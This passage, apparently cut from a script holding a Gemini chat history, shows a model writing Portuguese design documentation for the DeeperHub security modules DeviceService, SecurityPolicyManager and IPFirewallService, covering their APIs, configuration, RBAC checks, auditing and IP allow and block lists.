### 6.8. `DeeperHub.Security.DeviceService.unblock_device(user_id :: String.t(), device_id_or_fp :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descrição:** Desbloqueia um dispositivo.

### 6.9. `DeeperHub.Security.DeviceService.is_trusted_device?(user_id :: String.t(), fingerprint :: String.t()) :: boolean()`

*   **Descrição:** Verifica rapidamente se a fingerprint corresponde a um dispositivo confiável para o usuário.

### 6.10. `DeeperHub.Security.DeviceService.update_last_used(user_id :: String.t(), fingerprint :: String.t(), ip_address :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descrição:** Atualiza o timestamp de último uso e o último IP conhecido para um dispositivo identificado pela fingerprint. Registra o dispositivo se ele for novo.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :device_service, :default_trust_duration_days]`** (Integer): Duração padrão em dias para um dispositivo ser considerado confiável se nenhuma duração específica for fornecida. (Padrão: `30`)
*   **`[:security, :device_service, :max_trusted_devices_per_user]`** (Integer): Número máximo de dispositivos que um usuário pode marcar como confiáveis. (Padrão: `5`)
*   **`[:security, :device_service, :auto_untrust_inactive_days]`** (Integer | nil): Número de dias de inatividade após os quais um dispositivo confiável perde automaticamente sua confiança. `nil` para desabilitar. (Padrão: `90`)
*   **`[:security, :device_service, :cleanup_inactive_devices_days]`** (Integer | nil): Número de dias de inatividade após os quais um dispositivo não confiável e não bloqueado é removido. `nil` para desabilitar. (Padrão: `365`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.EventBus`.
*   `DeeperHub.Security.DeviceFingerprint`: Para gerar fingerprints.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter políticas relacionadas a dispositivos.
*   `DeeperHub.Audit`: Para registrar ações de gerenciamento de dispositivos.

### 8.2. Bibliotecas Externas

*   `Ecto`: Para persistência.

## 🤝 9. Como Usar / Integração

*   **Fluxo de Login (`DeeperHub.Auth`):**
    *   Após o login, obter a fingerprint do dispositivo atual.
    *   Chamar `DeviceService.update_last_used/3` para registrar a atividade do dispositivo.
    *   Verificar `DeviceService.is_trusted_device?/2`. Se não for confiável, e o risco for baixo, apresentar ao usuário a opção de confiar no dispositivo.
*   **Configurações de Segurança do Usuário (UI):**
    *   Chamar `DeviceService.list_devices/1` para exibir os dispositivos.
    *   Permitir que o usuário chame `trust_device`, `untrust_device`, `block_device` (para seus próprios dispositivos).

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o registro de novos dispositivos.
*   Testar a lógica de confiar/não confiar/bloquear/desbloquear.
*   Testar a atualização de `last_seen_at` e `last_known_ip`.
*   Testar a listagem de dispositivos com diferentes filtros.
*   Testar a consulta por fingerprint.
*   Localização: `test/deeper_hub/security/device_service/` (ou `device_management`).

### 10.2. Métricas

*   `deeper_hub.security.device.registered.count`
*   `deeper_hub.security.device.trusted.count`
*   `deeper_hub.security.device.untrusted.count`
*   `deeper_hub.security.device.blocked.count`
*   `deeper_hub.security.device.active_trusted.gauge` (Gauge, por usuário ou global)
*   `deeper_hub.security.device.login_from_new_device.count` (Contador)

### 10.3. Logs

*   **Nível INFO:** Novo dispositivo registrado, dispositivo marcado como confiável/não confiável/bloqueado.
*   **Nível WARNING:** Tentativa de registrar um dispositivo além do limite permitido para um usuário.
*   **Nível ERROR:** Falha ao persistir dados do dispositivo.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :device, :registered]`
    *   Metadados: `%{user_id: id, device_id: id, fingerprint: fp, initial_status: status}`
*   `[:deeper_hub, :security, :device, :status_changed]`
    *   Metadados: `%{user_id: id, device_id: id, fingerprint: fp, old_status: atom(), new_status: atom(), reason: reason}`
*   `[:deeper_hub, :security, :device, :accessed]`
    *   Metadados: `%{user_id: id, device_id: id, fingerprint: fp, ip_address: ip, is_trusted: boolean}`

## ❌ 11. Tratamento de Erros

*   Falhas ao registrar um dispositivo não devem impedir um login, mas devem ser logadas. O `RiskAssessment` pode tratar um dispositivo \"não registrável\" como de maior risco.
*   Conflitos (ex: duas requisições tentando registrar a mesma fingerprint para o mesmo usuário ao mesmo tempo) devem ser tratados pela camada de persistência (constraints de banco de dados).

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Autenticação para Gerenciamento:** Ações como `trust_device`, `untrust_device`, `block_device` devem ser protegidas e só podem ser realizadas pelo proprietário da conta ou por um administrador com as devidas permissões.
*   **Fingerprint não é Infalível:** A fingerprint é um identificador forte, mas não absoluto. Não deve ser o único fator para decisões de segurança críticas.
*   **Limpeza de Dados:** Definir políticas claras para retenção de dados de dispositivos inativos para cumprir com regulamentações de privacidade.

## 🧑‍💻 13. Contribuição

*   Garantir que as interações com o `DeviceFingerprint` sejam consistentes.
*   Manter a separação de responsabilidades: `DeviceFingerprint` gera/compara, `DeviceService` gerencia a entidade e seu estado.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um worker para desconfiar automaticamente dispositivos inativos por um longo período.
*   [ ] Permitir que os usuários nomeiem seus dispositivos registrados para facilitar a identificação. (Já incluso no schema, garantir UI).
*   [ ] Adicionar mais atributos ao `DeviceSchema` coletados de `device_info` para melhor análise e diferenciação (ex: modelo do dispositivo, versão do SO detalhada).
*   [ ] Notificar o usuário quando um novo dispositivo é registrado em sua conta.
*   [ ] Implementar limites no número de dispositivos que um usuário pode ter registrados ou marcados como confiáveis. (Já previsto na config).

---

*Última atualização: 2025-05-11*

---

Agora que cobrimos o gerenciamento de dispositivos, o `DeeperHub.Security.GeoLocationService` (que já documentamos parcialmente) seria o próximo passo natural para completar a contextualização de uma requisição/sessão. Depois dele, poderíamos ir para o `DeeperHub.Security.Policy.SecurityPolicyManager`. O que acha?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Já detalhamos o `DeeperHub.Security.GeoLocationService`. Então, vamos prosseguir para o `DeeperHub.Security.Policy.SecurityPolicyManager`. Este módulo é fundamental para a configurabilidade e adaptabilidade de toda a camada de segurança.

---

# Módulo: `DeeperHub.Security.Policy.SecurityPolicyManager` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.Policy.SecurityPolicyManager`

O módulo `DeeperHub.Security.Policy.SecurityPolicyManager` atua como o **gerenciador centralizado para todas as políticas de segurança** dentro do sistema DeeperHub. Ele fornece uma interface unificada para definir, consultar e atualizar diversas políticas que governam o comportamento dos diferentes submódulos de segurança (ex: `RiskAssessment`, `BruteForceProtection`, `MFA`, `SessionPolicy`, etc.).

Uma característica chave deste módulo é a integração com o sistema de Controle de Acesso Baseado em Papéis (`DeeperHub.RBAC`), garantindo que apenas usuários autorizados (tipicamente administradores de segurança) possam visualizar e modificar configurações críticas de segurança. Todas as alterações de política são, idealmente, auditadas.

Este módulo abstrai o armazenamento subjacente das políticas (que pode ser o `DeeperHub.Core.ConfigManager` ou um armazenamento dedicado) e adiciona uma camada de validação, autorização e lógica de negócio específica para políticas de segurança. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento Centralizado de Políticas:**
    *   Servir como o ponto único de verdade para a configuração de todas as políticas de segurança.
*   **Definição e Atualização de Políticas:**
    *   Permitir a criação e atualização de políticas para diversas áreas (ex: `update_security_config/4`).
    *   Suportar políticas com diferentes escopos (global, por tipo de usuário, por tenant, etc.), se necessário.
*   **Consulta de Políticas:**
    *   Fornecer uma API para que outros módulos de segurança consultem as políticas relevantes para suas operações (`get_security_configs/2`).
    *   Obter políticas modificadas em relação aos valores padrão (`get_modified_configs/2`).
*   **Validação de Políticas:**
    *   Validar os valores das políticas antes de aplicá-los para garantir que são válidos e consistentes (via `DeeperHub.Security.Validation.SecurityInputValidation`).
*   **Autorização RBAC:**
    *   Integrar com `DeeperHub.RBAC` para garantir que apenas usuários com as permissões adequadas possam visualizar ou modificar políticas de segurança (via `DeeperHub.Security.Policy.SecurityPolicyAuthorization`).
*   **Redefinição para Padrões:**
    *   Permitir a redefinição de políticas para seus valores padrão de fábrica (`reset_security_config/3`).
*   **Auditoria de Mudanças de Política:**
    *   Integrar com `DeeperHub.Audit` para registrar todas as alterações nas políticas de segurança, incluindo quem fez a alteração, quando e qual foi a mudança.
*   **Notificação de Mudanças de Política (Opcional):**
    *   Publicar eventos no `Core.EventBus` quando políticas de segurança críticas são alteradas, permitindo que os sistemas relevantes recarreguem suas configurações.
*   **Interface para Diferentes Tipos de Política:**
    *   Gerenciar políticas para:
        *   Limiares de Risco (`RiskAssessment`).
        *   Pesos de Fatores de Risco (`RiskAssessment`).
        *   Regras de Ação de Risco (`RiskAssessment`).
        *   Limiares de Força Bruta (`BruteForceProtection`).
        *   Duração de Bloqueios (`BruteForceProtection`, `IPFirewallService`).
        *   Regras de MFA (`DeeperHub.MFA.MFAPolicyService`).
        *   Políticas de Sessão (`DeeperHub.SessionPolicy`).
        *   Configurações de Criptografia (ex: frequência de rotação de chaves).
        *   Listas de IPs/Domínios Permitidos/Bloqueados (`IPFirewallService`, `EmailValidator`).
        *   E outras configurações de segurança.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.Policy.SecurityPolicyManager` (Fachada Pública):**
    *   Ponto de entrada para gerenciamento de políticas.
    *   Delega para o `SecurityPolicyService` (ou GenServer interno).
2.  **`DeeperHub.Security.Policy.SecurityPolicyService` (GenServer ou Módulo de Serviço):**
    *   **Responsabilidade:** Orquestra a lógica de gerenciamento de políticas.
    *   **Interações:**
        *   `SecurityPolicyAuthorization`: Para verificar permissões do usuário que está tentando modificar/visualizar.
        *   `DeeperHub.Security.Validation.SecurityInputValidation`: Para validar novos valores de política.
        *   `DeeperHub.Core.ConfigManager`: Como o *backend de armazenamento primário* para as políticas. O `SecurityPolicyManager` atua como uma camada de lógica de negócio e segurança sobre o `ConfigManager` para configurações especificamente de segurança.
        *   `DeeperHub.Audit`: Para registrar alterações.
        *   `DeeperHub.Core.EventBus` (opcional): Para notificar mudanças.
3.  **`DeeperHub.Security.Policy.SecurityPolicyAuthorization`:**
    *   **Responsabilidade:** Contém a lógica para verificar se um usuário tem permissão (via `DeeperHub.RBAC`) para acessar ou modificar uma determinada política ou área de política.
4.  **`DeeperHub.Security.Validation.SecurityInputValidation`:**
    *   Contém schemas e funções de validação específicas para diferentes tipos de políticas de segurança (ex: `validate_ip_firewall_config`, `validate_mfa_policy`).
5.  **`DeeperHub.Core.ConfigManager` (Backend de Armazenamento):**
    *   As políticas de segurança são, em última análise, configurações armazenadas e gerenciadas pelo `ConfigManager`. O `SecurityPolicyManager` garante que o acesso e a modificação dessas configurações específicas de segurança sigam um fluxo controlado.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/policy/
├── security_policy_manager.ex          # Fachada Pública
├── security_policy_service.ex          # Lógica de Serviço (pode ser GenServer)
├── security_policy_authorization.ex    # Lógica de autorização RBAC
│
└── supervisor.ex                       # Supervisor (se SecurityPolicyService for GenServer)

lib/deeper_hub/security/validation/     # (Já existe, mas SecurityInputValidation é usado aqui)
└── security_input_validation.ex
```

### 3.3. Decisões de Design Importantes

*   **Camada de Abstração sobre `ConfigManager`:** Em vez de os módulos de segurança acessarem diretamente o `ConfigManager` para todas as suas configurações, eles podem passar pelo `SecurityPolicyManager` para obter configurações que são consideradas \"políticas de segurança\". Isso centraliza a lógica de autorização e validação específica de segurança.
*   **RBAC para Modificações:** Qualquer alteração em uma política de segurança deve ser estritamente controlada por permissões RBAC.
*   **Valores Padrão Robustos:** O sistema deve ter valores padrão seguros para todas as políticas, caso não sejam explicitamente configurados.
*   **Clareza na Nomenclatura das Chaves:** As chaves de configuração usadas para políticas de segurança no `ConfigManager` devem seguir um padrão claro (ex: `security.policy.brute_force.login.max_attempts`).

## 🛠️ 4. Casos de Uso Principais

*   **Administrador de Segurança Define Limite de Tentativas de Login:**
    *   Admin acessa a interface de gerenciamento de políticas.
    *   Tenta atualizar a política `brute_force.login.max_attempts` para `3`.
    *   A UI chama `SecurityPolicyManager.update_security_config(admin_user_id, \"security.policy.brute_force.login.max_attempts\", 3, opts)`.
    *   `SecurityPolicyAuthorization` verifica se `admin_user_id` tem permissão para alterar políticas de força bruta.
    *   `SecurityInputValidation` valida se `3` é um valor aceitável para essa política.
    *   `SecurityPolicyService` chama `Core.ConfigManager.set(\"security.policy.brute_force.login.max_attempts\", 3, ...)`.
    *   `Audit` registra a alteração.
*   **Módulo `RiskAssessment` Consulta Limiar de Risco:**
    *   `RiskCalculatorService` precisa do limiar para classificar um score como `:high`.
    *   Chama `SecurityPolicyManager.get_security_configs(nil, %{config_key_prefix: \"security.policy.risk_assessment.thresholds\"})` ou diretamente `Core.ConfigManager.get(\"security.policy.risk_assessment.thresholds.high\", \"global\", 75)`. A primeira opção é preferível se houver lógica de autorização para *visualizar* certas políticas.
*   **Sistema Redefine Política de MFA para o Padrão:**
    *   Um administrador solicita a redefinição da política de MFA.
    *   A UI chama `SecurityPolicyManager.reset_security_config(admin_user_id, \"security.policy.mfa.default_method\", opts)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Atualização de uma Política de Segurança

1.  **Interface (Admin UI/Console):** Um usuário administrador tenta modificar uma política (ex: aumentar o TTL da sessão).
2.  **Chamada à Fachada:** A interface chama `DeeperHub.Security.Policy.SecurityPolicyManager.update_security_config(admin_user_id, \"security.policy.session.max_duration_seconds\", 7200, %{reason: \"Policy review\"})`.
3.  **`SecurityPolicyService`:**
    *   Recebe a solicitação.
    *   Chama `SecurityPolicyAuthorization.authorize_config_change(admin_user_id, \"security.policy.session.max_duration_seconds\")`.
        *   **Falha na Autorização:** Retorna `{:error, :unauthorized}`.
    *   Se autorizado, chama `DeeperHub.Security.Validation.SecurityInputValidation.validate_security_policy(7200, :session_duration, opts)`.
        *   **Falha na Validação:** Retorna `{:error, :validation_failed, errors}`.
    *   Se validado, chama `DeeperHub.Core.ConfigManager.set(\"security.policy.session.max_duration_seconds\", 7200, %{scope: \"global\", description: \"Max session TTL\", created_by: admin_user_id})`.
    *   Se `ConfigManager.set` for bem-sucedido:
        *   Chama `DeeperHub.Audit.log_event(...)` para registrar a alteração da política.
        *   (Opcional) Publica um evento `config_changed` ou `security_policy_changed` no `Core.EventBus`.
        *   Retorna `{:ok, 7200}`.
    *   Se `ConfigManager.set` falhar, propaga o erro.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Security.Policy.SecurityPolicyManager`)

### 6.1. `DeeperHub.Security.Policy.SecurityPolicyManager.get_security_configs(requesting_user_id :: String.t() | nil, opts :: keyword()) :: {:ok, map()} | {:error, :unauthorized | term()}`

*   **Descrição:** Obtém as configurações de segurança que o `requesting_user_id` tem permissão para visualizar. Se `requesting_user_id` for `nil` (sistema interno), pode retornar todas.
*   **`opts`:**
    *   `:policy_area` (atom | String.t | nil): Filtra por uma área específica de política (ex: `:brute_force`, `\"risk_assessment.thresholds\"`).
    *   `:keys_only` (boolean): Retorna apenas as chaves das políticas, não os valores.
*   **Retorno:** Um mapa onde as chaves são os nomes das políticas (ex: `\"security.mfa.required_for_admin\"`) e os valores são os valores das políticas.

### 6.2. `DeeperHub.Security.Policy.SecurityPolicyManager.update_security_config(admin_user_id :: String.t(), config_key :: String.t(), new_value :: term(), opts :: keyword()) :: {:ok, term()} | {:error, :unauthorized | :validation_failed | term()}`

*   **Descrição:** Atualiza o valor de uma política de segurança específica. Requer que `admin_user_id` tenha as permissões adequadas.
*   **`config_key`:** A chave completa da política no `ConfigManager` (ex: `\"security.brute_force.login.max_attempts\"`).
*   **`new_value`:** O novo valor para a política.
*   **`opts`:**
    *   `:reason` (String.t): Motivo da alteração, para auditoria.
    *   `:scope` (String.t): Escopo da configuração no ConfigManager. (Padrão: `\"global\"`)
*   **Retorno:** `{:ok, new_value_applied}` ou erro.

### 6.3. `DeeperHub.Security.Policy.SecurityPolicyManager.update_multiple_configs(admin_user_id :: String.t(), configs_map :: map(), opts :: keyword()) :: {:ok, updated_configs :: map()} | {:error, :unauthorized | :validation_failed | term()}`

*   **Descrição:** Atualiza múltiplas políticas de segurança em uma única operação transacional (se possível pelo `ConfigManager`).
*   **`configs_map`:** Mapa de `{config_key, new_value}`.

### 6.4. `DeeperHub.Security.Policy.SecurityPolicyManager.reset_security_config(admin_user_id :: String.t(), config_key :: String.t(), opts :: keyword()) :: {:ok, default_value :: term()} | {:error, :unauthorized | term()}`

*   **Descrição:** Redefine uma política de segurança para seu valor padrão do sistema.
*   **Retorno:** `{:ok, default_value_restored}` ou erro.

## ⚙️ 7. Configuração

O próprio `SecurityPolicyManager` pode ter algumas configurações no `Core.ConfigManager`:
*   `[:security, :policy_manager, :default_policy_values_module]` (Module): Módulo que define os valores padrão de fábrica para todas as políticas de segurança. Isso é usado pela função `reset_security_config`.
*   `[:security, :policy_manager, :rbac_permissions, :view_policy_prefix]` (String): Prefixo da permissão RBAC necessária para visualizar políticas (ex: `\"security.policy.view.\"`).
*   `[:security, :policy_manager, :rbac_permissions, :edit_policy_prefix]` (String): Prefixo da permissão RBAC necessária para editar políticas (ex: `\"security.policy.edit.\"`).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Como backend de armazenamento para as políticas.
*   `DeeperHub.Core.Logger`, `Core.Metrics`, `Core.EventBus`.
*   `DeeperHub.RBAC`: Para verificar permissões de acesso e modificação das políticas.
*   `DeeperHub.Security.Validation.SecurityInputValidation`: Para validar os valores das políticas.
*   `DeeperHub.Audit`: Para registrar alterações nas políticas.

### 8.2. Bibliotecas Externas

*   Nenhuma específica, além das usadas pelos módulos Core.

## 🤝 9. Como Usar / Integração

*   **Módulos de Segurança:** Em vez de chamarem `Core.ConfigManager.get/3` diretamente para suas configurações operacionais, os módulos como `BruteForceProtection`, `RiskAssessment`, etc., devem chamar `SecurityPolicyManager.get_security_configs/2` (ou uma função mais específica se criada) para obter suas políticas. Isso garante que a obtenção de políticas também possa, se necessário, passar por uma camada de lógica (embora para leitura, a autorização seja menos comum do que para escrita).
    ```elixir
    # Em BruteForceProtectionService
    defp get_login_max_attempts do
      # Poderia ser Core.ConfigManager.get(\"security.policy.brute_force.login.max_attempts\", \"global\", 5)
      # Ou, para centralizar lógica de políticas de segurança:
      case SecurityPolicyManager.get_security_configs(nil, policy_area: \"brute_force.login\") do
        {:ok, %{\"security.policy.brute_force.login.max_attempts\" => val}} -> val
        _ -> 5 # Fallback para um padrão seguro do código
      end
    end
    ```
*   **Interfaces de Administração:** Qualquer UI ou comando de console que permita a visualização ou modificação de políticas de segurança deve usar o `SecurityPolicyManager` para garantir que as verificações de autorização e validação sejam aplicadas.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o acesso e modificação de políticas com diferentes papéis de usuário (com e sem permissão).
*   Testar a validação de diferentes tipos de valores de política.
*   Testar a redefinição de políticas para o padrão.
*   Verificar se as alterações são corretamente persistidas no `ConfigManager` e se os eventos de auditoria são gerados.
*   Localização: `test/deeper_hub/security/policy/`.

### 10.2. Métricas

*   `deeper_hub.security.policy_manager.configs.viewed.count` (tags: `requesting_user_role`, `policy_area`)
*   `deeper_hub.security.policy_manager.configs.updated.count` (tags: `admin_user_role`, `policy_key`, `status` (`success`, `unauthorized`, `validation_failed`))
*   `deeper_hub.security.policy_manager.configs.reset.count` (tags: `admin_user_role`, `policy_key`)

### 10.3. Logs

*   **Nível INFO:** Alterações de política bem-sucedidas (quem, o quê, quando, porquê).
*   **Nível WARNING:** Tentativas não autorizadas de visualizar ou modificar políticas. Falhas de validação ao tentar definir uma política.
*   **Nível ERROR:** Erros internos no `SecurityPolicyService`.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :policy_manager, :config_access, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, action: :view | :update | :reset, keys_accessed: list_of_keys, authorized: boolean}`
*   `[:deeper_hub, :security, :policy_manager, :config_validation, :stop]`
    *   Metadados: `%{key: key, value_provided: val, is_valid: boolean, errors: errors_if_any}`

## ❌ 11. Tratamento de Erros

*   Falhas de autorização devem retornar claramente `{:error, :unauthorized}`.
*   Falhas de validação devem retornar `{:error, :validation_failed, details}`.
*   Se o `ConfigManager` falhar ao persistir uma política, o erro deve ser propagado.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Permissões RBAC:** A definição de quais papéis podem gerenciar quais políticas é a principal linha de defesa. Essas permissões devem ser o mais granulares possível (ex: um papel pode gerenciar políticas de MFA, outro pode gerenciar políticas de firewall).
*   **Auditoria Imutável:** Os logs de auditoria para alterações de política devem ser protegidos contra adulteração.
*   **Valores Padrão Seguros:** O sistema deve funcionar de forma segura mesmo se nenhuma política for explicitamente configurada, usando os padrões de fábrica.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novas áreas de política de segurança, defina as permissões RBAC correspondentes em `SecurityPolicyAuthorization`.
*   Adicione funções de validação em `SecurityInputValidation` para os novos tipos de política.
*   Garanta que os valores padrão para novas políticas sejam seguros.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para facilitar o gerenciamento visual das políticas de segurança.
*   [ ] Adicionar versionamento de políticas, permitindo rollback para configurações anteriores.
*   [ ] Permitir a importação/exportação de conjuntos de políticas (ex: para replicar configurações entre ambientes).
*   [ ] Introduzir \"perfis de política de segurança\" (ex: \"Alta Segurança\", \"Conveniência Equilibrada\") que administradores podem aplicar globalmente.
*   [ ] Adicionar validações mais complexas entre políticas (ex: garantir que o TTL da sessão não seja menor que o timeout de inatividade do MFA).

---

*Última atualização: 2025-05-11*

---

Este módulo age como um guardião para as configurações de segurança.

Agora, podemos ir para `DeeperHub.Security.IPFirewallService` (que foi referenciado aqui e é um consumidor de políticas), ou talvez detalhar o `DeeperHub.Core.Cache`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos detalhar o `DeeperHub.Security.IPFirewallService`. Este serviço é uma linha de defesa importante, controlando o acesso à aplicação com base em endereços IP.

---

# Módulo: `DeeperHub.Security.IPFirewallService` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.IPFirewallService`

O módulo `DeeperHub.Security.IPFirewallService` é responsável por gerenciar e aplicar regras de firewall baseadas em endereços IP para o sistema DeeperHub. Ele permite a criação de listas de permissão (allowlists) e listas de bloqueio (blocklists) de IPs, controlando quais endereços podem ou não acessar a aplicação ou partes dela.

Este serviço é crucial para mitigar ameaças como tráfego malicioso conhecido, ataques de bots, e para restringir o acesso a recursos sensíveis apenas a redes confiáveis. Ele trabalha em conjunto com o `DeeperHub.Security.Cache.SecurityCache` para performance e com o `DeeperHub.Security.Policy.SecurityPolicyManager` para configurações. 😊

*(Nota: A documentação original mencionava `DeeperHub.Security.Config.IPFirewallConfig` e `DeeperHub.Security.Services.IpFirewallService` e `DeeperHub.Security.Plugs.IPFirewallPlug`. Esta documentação consolida a lógica de serviço em `IPFirewallService` e a configuração via `SecurityPolicyManager` ou `Core.ConfigManager`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Listas de Bloqueio (Blocklists):**
    *   Permitir o bloqueio de endereços IP específicos ou ranges CIDR (`block_ip/4`).
    *   Suportar bloqueios temporários (com expiração) e permanentes.
    *   Manter um registro do motivo e da origem do bloqueio.
*   **Gerenciamento de Listas de Permissão (Allowlists/Whitelists):**
    *   Permitir a adição de IPs ou ranges CIDR que sempre terão acesso, mesmo que outras regras os bloqueiem (`allow_ip/4`).
    *   Suportar permissões temporárias e permanentes.
*   **Verificação de IP:**
    *   Verificar se um determinado endereço IP está bloqueado (`is_blocked?/1`).
    *   Verificar se um determinado endereço IP está explicitamente permitido (`is_allowed?/1`).
*   **Aplicação de Regras:**
    *   Fornecer uma interface para que Plugs (como `IPFirewallPlug`) ou outros módulos verifiquem o status de um IP e tomem ações (permitir/negar acesso).
    *   A lógica de precedência (ex: allowlist sobrepõe blocklist) deve ser clara.
*   **Limpeza de Entradas Expiradas:**
    *   Remover automaticamente bloqueios e permissões temporárias que expiraram (pode ser via TTL do cache ou um worker de limpeza).
*   **Integração com Cache:**
    *   Utilizar `DeeperHub.Security.Cache.SecurityCache` para armazenar listas de bloqueio/permissão para acesso rápido e eficiente.
*   **Configurabilidade:**
    *   Carregar listas iniciais de IPs bloqueados/permitidos de arquivos de configuração ou do `SecurityPolicyManager`.
    *   Configurar durações padrão para bloqueios/permissões temporárias.
*   **Observabilidade:**
    *   Registrar métricas sobre o número de IPs bloqueados/permitidos, e o número de requisições bloqueadas/permitidas pelo firewall.
    *   Logar ações de bloqueio, permissão e verificações significativas.
*   **Auditoria:**
    *   Integrar com `DeeperHub.Audit` para registrar quem adicionou/removeu IPs das listas e por quê.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.IPFirewallService` (Fachada/Serviço Principal):**
    *   **Responsabilidade:** Ponto de entrada para todas as operações de gerenciamento de firewall de IP. Contém a lógica de negócio principal.
    *   **Interações:**
        *   `DeeperHub.Security.Cache.SecurityCache`: Para ler e escrever o status de bloqueio/permissão de IPs.
        *   `DeeperHub.Core.Repo` (via `DeeperHub.Security.Schema.IPBlock` e `IPAllow`): Para persistir bloqueios/permissões permanentes ou para recuperação do cache após reinício.
        *   `DeeperHub.Security.Policy.SecurityPolicyManager` ou `Core.ConfigManager`: Para obter configurações como durações padrão, listas iniciais.
        *   `DeeperHub.Audit`: Para registrar modificações nas listas.
        *   `DeeperHub.Core.EventBus` (opcional): Para publicar eventos sobre IPs bloqueados/desbloqueados.
2.  **`DeeperHub.Security.Cache.SecurityCache`:**
    *   **Responsabilidade:** Armazenar em cache (provavelmente ETS) os IPs bloqueados e permitidos com seus TTLs para verificação de alta performance. As chaves podem ser prefixadas (ex: `\"ip_firewall:blocked:<ip_address>\"`).
3.  **`DeeperHub.Security.Schema.IPBlock` e `DeeperHub.Security.Schema.IPAllow` (Ecto Schemas):**
    *   **Responsabilidade:** Definem a estrutura para persistir bloqueios e permissões permanentes ou de longa duração no banco de dados.
4.  **`DeeperHub.Security.Plugs.IPFirewallPlug` (Phoenix Plug):**
    *   **Responsabilidade:** Integrar com o pipeline de requisições web para verificar cada requisição recebida contra o `IPFirewallService`.
    *   **Interações:** Chama `IPFirewallService.is_blocked?/1` e `is_allowed?/1`.
5.  **Configurações (via `Core.ConfigManager` / `SecurityPolicyManager`):**
    *   Listas de IPs permanentemente bloqueados/permitidos.
    *   Duração padrão para bloqueios/permissões temporárias.
    *   Intervalo de limpeza do cache (se não for puramente baseado em TTL).

### 3.2. Estrutura de Diretórios (Proposta)

Dentro de `lib/deeper_hub/security/`:
```
├── ip_firewall_service.ex            # Lógica de Serviço Principal (pode ser GenServer para tarefas como carregar do DB para ETS)
│
├── config/                           # (Onde IPFirewallConfig residia)
│   └── (As funções de config agora seriam parte do SecurityPolicyManager ou Core.ConfigManager)
│
├── schemas/                          # (Pode estar em um diretório de schemas de segurança global)
│   ├── ip_block.ex
│   └── ip_allow.ex
│
└── plugs/                            # (Se o Plug for específico deste módulo e não em _web)
    └── ip_firewall_plug.ex
```
O `SecurityCache` já está em `security/cache/`.

### 3.3. Decisões de Design Importantes

*   **Performance da Verificação:** A verificação `is_blocked?/is_allowed?` deve ser extremamente rápida, pois será chamada em cada requisição. Daí a importância do cache em memória (ETS).
*   **Persistência vs. Cache:**
    *   Bloqueios/permissões temporários (ex: por algumas horas) podem residir apenas no cache ETS com TTL.
    *   Bloqueios/permissões permanentes ou de longa duração devem ser persistidos no banco de dados e carregados no cache ETS na inicialização ou sob demanda.
*   **Granularidade:** Suporte para IPs individuais e ranges CIDR.
*   **Precedência:** Definir claramente a ordem de verificação (ex: Allowlist tem precedência sobre Blocklist).
*   **Gerenciamento:** Deve haver uma forma (API, Console) para administradores gerenciarem as listas.

## 🛠️ 4. Casos de Uso Principais

*   **Requisição de IP Bloqueado:**
    *   `IPFirewallPlug` intercepta uma requisição.
    *   Chama `IPFirewallService.is_blocked?(\"1.2.3.4\")`.
    *   Serviço verifica no cache. Se bloqueado, o Plug retorna uma resposta 403 Forbidden.
*   **Administrador Bloqueia um IP Permanentemente:**
    *   Admin usa o `DeeperHub.Console` ou UI para bloquear um IP.
    *   Chama `IPFirewallService.block_ip(\"5.6.7.8\", \"Fonte de ataque conhecido\", nil, %{admin_id: \"admin1\"})`.
    *   Serviço persiste no DB, atualiza o cache e audita a ação.
*   **Serviço de Detecção de Intrusão Bloqueia IP Temporariamente:**
    *   `DeeperHub.Security.IntrusionDetection` detecta atividade suspeita.
    *   Chama `IPFirewallService.block_ip(\"9.10.11.12\", \"Múltiplas tentativas de SQLi\", 3600)`.
    *   Serviço adiciona ao cache com TTL de 1 hora.
*   **Adicionar Rede Corporativa à Allowlist:**
    *   Admin configura `IPFirewallService.allow_ip(\"192.168.1.0/24\", \"Rede Interna\", nil)`.
    *   Requisições dessa rede bypassarão outras verificações de blocklist.

## 🌊 5. Fluxos Importantes

### Fluxo de Verificação de IP pelo `IPFirewallPlug`

1.  **Requisição Entra:** Chega uma nova requisição HTTP.
2.  **`IPFirewallPlug.call/2`:**
    *   Extrai o IP do cliente da `conn`.
    *   Chama `DeeperHub.Security.IPFirewallService.is_allowed?(client_ip)`.
    *   **Se Permitido (`true`):** A requisição prossegue no pipeline.
